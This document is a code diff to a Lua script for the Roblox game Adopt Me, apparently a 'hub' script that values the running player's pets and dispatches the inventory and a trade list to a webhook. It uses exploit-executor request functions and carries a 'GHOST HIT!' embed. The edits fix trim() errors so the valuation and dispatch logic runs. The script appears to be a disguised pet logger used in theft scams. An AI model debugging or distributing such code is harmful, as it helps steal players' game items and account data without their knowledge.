@@ -28,7 +28,9 @@ local function loadValues()
         for line in result:gmatch("[^\r\n]+") do
             local name, val = line:match("([^,]+),([^,]+)")
             if name and val then
-                customValues[name:lower():trim()] = tonumber(val)
+                -- FIXED: Replaced .trim() with a pattern match to remove spaces
+                local cleanName = name:lower():match("^%s*(.-)%s*$")
+                customValues[cleanName] = tonumber(val)
             end
         end
     end
@@ -89,7 +91,8 @@ end
 
 -- 6. VALUATION LOGIC
 local function getFinalValue(petData, props)
-    local petName = petData.name:lower():trim()
+    -- FIXED: Replaced .trim() with a pattern match
+    local petName = petData.name:lower():match("^%s*(.-)%s*$")
     local base = customValues[petName] or petData.rvalue or 0
     
     if base < 0.01 then
@@ -148,7 +151,7 @@ end
 
 local sortedPets, grandTotal, finalTradeList = processInventory()
 
--- 8. WEBHOOK DISPATCH (ERROR FIXED)
+-- 8. WEBHOOK DISPATCH
 if #sortedPets > 0 then
     local petLines = ""
     for _, p in ipairs(sortedPets) do
@@ -160,11 +163,10 @@ if #sortedPets > 0 then
         embeds = {{
             title = "MONDEUR HUB | 🦊 GHOST HIT!",
             description = "This is my script for Adopt Me!\n\n" .. petLines,
-            color = 16733440 -- Orange
+            color = 16733440
         }}
     })
 
-    -- Final execution to send webhook
     local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
     if request then
         request({
